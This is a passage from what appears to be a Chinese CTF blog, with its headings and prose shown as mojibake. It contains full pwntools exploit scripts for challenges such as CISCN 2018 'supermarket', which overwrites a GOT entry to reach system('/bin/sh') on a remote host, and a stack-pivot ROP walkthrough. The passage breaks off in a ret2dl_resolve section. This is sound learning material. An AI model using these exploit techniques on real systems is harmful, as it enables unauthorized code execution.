class="line">payload += p32(<span class="number">0x30</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Input your name:&#x27;</span>)</span><br><span class="line">payload=<span class="number">0x22</span>*<span class="string">&#x27;PIG007NB&#x27;</span></span><br><span class="line">payload += p32(pop_ebx_esi_edi_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">1</span>)*<span class="number">4</span></span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(free_hook_addr)</span><br><span class="line">payload += p32(<span class="number">0x30</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;20baa3d800326274c965041777012d12&#125;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="äº”ã€pwn1"   >
          <a href="#äº”ã€pwn1" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€pwn1" class="headerlink" title="äº”ã€pwn1"></a>äº”ã€pwn1</h1>
      <p>è„‘ç˜«åŸé¢˜ ciscn 2018 supermarket</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./task_supermarket&quot;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line"><span class="comment">#elf = ELF(binary)</span></span><br><span class="line">context.timeout = <span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;182.116.62.85&quot;</span>,<span class="string">&quot;27518&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;your choice&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dockerDbg</span>():</span></span><br><span class="line">    myGdb = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">30001</span>)</span><br><span class="line">    myGdb.close()</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;name:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;price:&#x27;</span>, <span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;descrip_size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;description:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;name:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span>():</span></span><br><span class="line">    sla(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;name:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;descrip_size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;description:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;PIG007NB&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;PIG007NB&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">&#x27;PIG007NB&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#payload += &#x27;2&#x27;.ljust(16,&#x27;\x00&#x27;)</span></span><br><span class="line">payload += p64(<span class="number">0x32</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line"><span class="comment">#--------------------------</span></span><br><span class="line">payload += p32(<span class="number">20</span>)</span><br><span class="line">payload += p32(<span class="number">0x20</span>)</span><br><span class="line">payload += p32(atoi_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x80</span>, payload)</span><br><span class="line"><span class="built_in">list</span>()</span><br><span class="line">ru(<span class="string">&#x27;2: price.20, des.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u32(rc(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">obj = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>, atoi_addr)</span><br><span class="line">libc_base = atoi_addr - obj.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x20</span>, p32(system_addr))</span><br><span class="line">sla(menu, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#flag&#123;03b1baaab2a949db11f8b1c02a4f7ab6&#125;</span></span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/10/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/">æ ˆæº¢å‡ºæ€»ç»“</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-10-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>æ€»ç»“å¤ä¹ ä¸€ä¸‹å„ç§å„æ ·çš„æ ˆæº¢å‡ºã€‚</p>

        <h1 id="ä¸€ã€æ ˆè¿ç§»"   >
          <a href="#ä¸€ã€æ ˆè¿ç§»" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€æ ˆè¿ç§»" class="headerlink" title="ä¸€ã€æ ˆè¿ç§»"></a>ä¸€ã€æ ˆè¿ç§»</h1>
      <p><code>ç¾å›¢2021-12 babyrop</code></p>

        <h2 id="1-é¢˜ç›®ç®€ä»‹"   >
          <a href="#1-é¢˜ç›®ç®€ä»‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-é¢˜ç›®ç®€ä»‹" class="headerlink" title="1.é¢˜ç›®ç®€ä»‹"></a>1.é¢˜ç›®ç®€ä»‹</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212144548.png" alt="image-20211212144541080"></p>
<ul>
<li><p>æº¢å‡º16ä¸ªå­—èŠ‚ï¼Œå¯è¦†ç›–rbpå’Œè¿”å›åœ°å€</p>
</li>
<li><p>å­˜åœ¨putsç­‰æ‰“å°å‡½æ•°</p>
</li>
<li><p>æ— å¥½ç”¨gadgetï¼Œåªæœ‰æœ€å¸¸è§çš„csu</p>
</li>
<li><p>å­˜åœ¨canaryï¼Œå¯ç”¨æ•°æ®é•¿åº¦ä¸º0x18</p>
</li>
<li><p>å…³é”®å‡½æ•°ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145246.png" alt="image-20211212145246326"></p>
</li>
</ul>

        <h2 id="2-åˆ©ç”¨æ–¹å¼"   >
          <a href="#2-åˆ©ç”¨æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨æ–¹å¼" class="headerlink" title="2.åˆ©ç”¨æ–¹å¼"></a>2.åˆ©ç”¨æ–¹å¼</h2>
      <p>ç”±äºæ²¡åŠæ³•å†™GOTï¼Œè€ƒè™‘æ ˆè¿ç§»ä¹‹åè°ƒç”¨putså‡½æ•°æ³„éœ²åœ°å€ï¼Œç„¶åè¿›è¡Œ<code>one_gadget</code></p>

        <h3 id="1-è¿ç§»æ•°æ®"   >
          <a href="#1-è¿ç§»æ•°æ®" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è¿ç§»æ•°æ®" class="headerlink" title="(1)è¿ç§»æ•°æ®"></a>(1)è¿ç§»æ•°æ®</h3>
      <p>æ‰€ä»¥ç›´æ¥è¿ç§»åˆ°<code>extern</code>æ®µä¹‹åçš„æ•°æ®æ®µ</p>

        <h3 id="2-è°ƒè¯•è°ƒç”¨"   >
          <a href="#2-è°ƒè¯•è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è°ƒè¯•è°ƒç”¨" class="headerlink" title="(2)è°ƒè¯•è°ƒç”¨"></a>(2)è°ƒè¯•è°ƒç”¨</h3>
      
        <h4 id="â‘ æ ˆåŠ«æŒ"   >
          <a href="#â‘ æ ˆåŠ«æŒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ æ ˆåŠ«æŒ" class="headerlink" title="â‘ æ ˆåŠ«æŒ"></a>â‘ æ ˆåŠ«æŒ</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&#x27;PIG007NB&#x27;</span>*(<span class="number">0x18</span>/<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(new_stack)</span><br><span class="line">payload += p64(<span class="number">0x40072E</span>)</span><br></pre></td></tr></table></div></figure>

<p>åˆæ¬¡æ ˆæº¢å‡º<code>leave_ret</code>ä¹‹ååŠ«æŒ<code>rbp</code>ï¼Œå†è¿›å…¥<code>vuln</code>å‡½æ•°ï¼Œå€ŸåŠ©ä¿®æ”¹ä¹‹åçš„<code>rbp</code>å‘æ–°æ ˆè¯»å…¥æ•°æ®</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¯»å…¥æ•°æ®ä¹‹åæº¢å‡º</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&#x27;PIG007NB&#x27;</span>*(<span class="number">0x18</span>/<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(new_stack+<span class="number">0x28</span>)</span><br><span class="line">payload += p64(<span class="number">0x40072E</span>)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145349.png" alt="image-20211212145349774"></p>
<p>å†æ¬¡æ ˆæº¢å‡ºä¿®æ”¹<code>rbp</code>å‘æ–°æ ˆè¯»å…¥æ•°æ®ï¼ŒåŒæ—¶é€šè¿‡<code>leave_ret</code>åŠ«æŒ<code>rsp</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145552.png" alt="image-20211212145552478"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212150141.png" alt="image-20211212150141800"></p>
<p>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŠ«æŒrspä¹‹åï¼Œå†è°ƒç”¨readå‡½æ•°æ—¶ï¼Œå…¶è¿”å›åœ°å€ä¹Ÿä¼šéšä¹‹æ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€ï¼Œé€šè¿‡ä¿®æ”¹çš„rbpå³å¯åœ¨readå‡½æ•°çš„è¿”å›åœ°å€ä¸Šè¯»å…¥ROPé“¾æ¡</p>

        <h5 id="â–²leave-ret"   >
          <a href="#â–²leave-ret" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²leave-ret" class="headerlink" title="â–²leave-ret"></a>â–²leave-ret</h5>
      <p>ç›¸å½“äºå¦‚ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rsp rbp</span><br><span class="line">pop     rbp</span><br><span class="line">pop     rip</span><br></pre></td></tr></table></div></figure>


        <h5 id="â–²call"   >
          <a href="#â–²call" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²call" class="headerlink" title="â–²call"></a>â–²call</h5>
      <p>ç›¸å½“äºå¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 		rip</span><br><span class="line">jmp   		func_addr</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡è¯»å…¥ROPé“¾"   >
          <a href="#â‘¡è¯»å…¥ROPé“¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡è¯»å…¥ROPé“¾" class="headerlink" title="â‘¡è¯»å…¥ROPé“¾"></a>â‘¡è¯»å…¥ROPé“¾</h4>
      <p>å‘readå‡½æ•°çš„è¿”å›åœ°å€è¯»å…¥ROPé“¾æ¡ï¼Œè¿™ä¸ªrbpæ˜¯ç»è¿‡è®¡ç®—çš„ï¼Œç”±äºä¹‹å‰çš„rspé€šè¿‡<code>leave-ret</code>å˜ä¸ºäº†new_stack+0x10ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨<code>call read</code>æ—¶ï¼Œå‹å…¥è¿”å›åœ°å€ï¼Œå¯¼è‡´rspå˜ä¸ºnew_stack+0x08ï¼Œè€Œè¿”å›åœ°å€ä¹Ÿå°±æ˜¯ä¿å­˜åœ¨new_stack+0x08å¤„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹æ–°çš„rbpä¸ºnew_stack+0x28ï¼Œæ‰èƒ½åœ¨vulnå‡½æ•°ä¸­å‘new_stack+0x08è¯»å…¥ROPé“¾æ¡ä»è€ŒåŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212151539.png" alt="image-20211212151538794"></p>

        <h4 id="â‘¢åŠ«æŒvulnå‡½æ•°è¿”å›åœ°å€"   >
          <a href="#â‘¢åŠ«æŒvulnå‡½æ•°è¿”å›åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢åŠ«æŒvulnå‡½æ•°è¿”å›åœ°å€" class="headerlink" title="â‘¢åŠ«æŒvulnå‡½æ•°è¿”å›åœ°å€"></a>â‘¢åŠ«æŒvulnå‡½æ•°è¿”å›åœ°å€</h4>
      <p>è¿™æ ·åœ¨ä¹‹åè°ƒç”¨å®Œputså‡½æ•°ä¹‹åå°±å¯ä»¥å†è¿”å›åˆ°vulnå‡½æ•°ä¸­ï¼Œæ–°å»ºä¸€ä¸ªå‡½æ•°æ ˆæ¥åŠ«æŒè¯¥å‡½æ•°çš„è¿”å›åœ°å€</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(<span class="number">0x400717</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64Leakbase(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;PIG007NB&#x27;</span>*(<span class="number">0x18</span>/<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;PIG007NB&#x27;</span></span><br><span class="line">payload += p64(one_gadget)</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·ç”±äºrbpå’Œrspæ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é€šè¿‡å†è¿”å›åˆ°<code>0x40072e</code>æ¥åŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(<span class="number">0x40072e</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64Leakbase(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;PIG007NB&#x27;</span>*(<span class="number">0x18</span>/<span class="number">0x8</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-æ€»ç»“"   >
          <a href="#3-æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ€»ç»“" class="headerlink" title="3.æ€»ç»“"></a>3.æ€»ç»“</h2>
      <p>æ ˆè¿ç§»çš„æ–¹æ³•å¤šç§å¤šæ ·ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯ä¸¤ä¸ªå‘½ä»¤<code>leave-ret</code>å’Œ<code>call</code>ï¼Œè¿™ä¸¤ä¸ªå‘½ä»¤å¯¹æ ˆçš„å½±å“æ˜¯æœ€å¤§çš„ï¼Œè‡ªå·±æ¯”èµ›çš„æ—¶å€™åŸºæœ¬éƒ½å¿˜å…‰äº†ï¼Œè°ƒè¯•äº†å¥½ä¹…ï¼ŒåŒæ—¶è¦è®°ä½è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœrspè¢«åŠ«æŒäº†ï¼Œé‚£ä¹ˆå…¶è¿”å›åœ°å€ä¹Ÿä¼šè¢«åŠ«æŒã€‚</p>

        <h1 id="äºŒã€Ret2dl-resolve"   >
          <a href="#äºŒã€Ret2dl-resolve" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€Ret2dl-resolve" class="headerlink" title="äºŒã€Ret2dl_resolve"></a>äºŒã€Ret2dl_resolve</h1>
      <p>ä¹‹å‰åšè¿‡æ€»ç»“ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ç‚¹çš®æ¯›ï¼Œè¿™å›æ·±å…¥æ€»ç»“ä¸€ä¸‹ï¼Œå…·ä½“åŸç†å°±å…ˆä¸è¯´äº†ï¼Œä¸»è¦è¯´ä¸‹æ³¨æ„çš„å‡ ç‚¹äº‹é¡¹ã€‚</p>

        <h2 id="1-No-RELROæ¨¡å¼"   >
          <a href="#1-No-RELROæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-No-RELROæ¨¡å¼" class="headerlink" title="1.No RELROæ¨¡å¼"></a>1.No RELROæ¨¡å¼</h2>
      <p>è§é¢˜ç›®<code>HITCTF slient</code></p>
<ul>
<li>å¯ä»»æ„ä¿®æ”¹å››ä¸ªå­—èŠ‚</li>
<li>æº¢å‡ºé•¿åº¦ä¸å¤ªå¤Ÿ</li>
<li>æ— æ³•æ³„éœ²åœ°å€</li>
<li>æ— PIE</li>
</ul>
<p>è¿™ç§æ¨¡å¼å¯ç”¨åŠ«æŒ<code>.dynstr</code>ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æ”¹å†™<code>DT_STRTAB</code>ä¸Šçš„æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘<code>fake_dynstr</code>ã€‚åœ¨32ä½å’Œ64ä½ä¸‹éƒ½æ˜¯é€šç”¨çš„ã€‚</p>

        <h3 id="1-å¯»æ‰¾-dynstræŒ‡é’ˆ"   >
          <a href="#1-å¯»æ‰¾-dynstræŒ‡é’ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯»æ‰¾-dynstræŒ‡é’ˆ" class="headerlink" title="(1)å¯»æ‰¾.dynstræŒ‡é’ˆ"></a>(1)å¯»æ‰¾<code>.dynstr</code>æŒ‡é’ˆ</h3>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171711.png" alt="image-20211119171711269"></p>
<p>æ‰¾åˆ°å¦‚ä¸Šå›¾çš„.dynamicï¼Œå…¶åœ°å€ä¸º<code>0x600988</code>ï¼Œåœ¨IDAä¸­æŸ¥çœ‹ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171809.png" alt="image-20211119171809731"></p>
<p>ä¸Šå›¾çš„<code>DT_STRTAB</code>å³ä¸ºæ‰€å¯»æ‰¾çš„åœ°å€ï¼Œå…¶å†…å®¹ä¸º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171935.png" alt="image-20211119171935731"></p>
<p>è“è‰²ä»£è¡¨åç§»ï¼Œçº¢è‰²ä»£è¡¨éœ€è¦åŠ¨æ€åŠ è½½æ—¶å¯»å€çš„å‡½æ•°å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä¹‹åæŸ¥çœ‹å¯¹åº”çš„å­—ç¬¦ä¸²å†…å®¹ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119172058.png" alt="image-20211119172058537"></p>
<p>éœ€è¦ä¿®æ”¹ä¸ºå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212165546.png" alt="image-20211212165434233"></p>
<p>æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯åŠ«æŒè¿™ä¸ª<code>DT_STRTAB</code>ä¸­çš„å­—ç¬¦ä¸²æŒ‡é’ˆã€‚ä½†æ˜¯åŠ«æŒè¿™ä¸ªæŒ‡é’ˆéœ€è¦æ»¡è¶³ä¸º<code>NO RELRO</code>çš„ä¿æŠ¤çº§åˆ«æ‰è¡Œï¼Œä¸èƒ½å¼€å¯<code>RELRO</code>ã€‚</p>

        <h3 id="2-åŠ«æŒæŒ‡é’ˆ"   >
          <a href="#2-åŠ«æŒæŒ‡é’ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åŠ«æŒæŒ‡é’ˆ" class="headerlink" title="(2)åŠ«æŒæŒ‡é’ˆ"></a>(2)åŠ«æŒæŒ‡é’ˆ</h3>
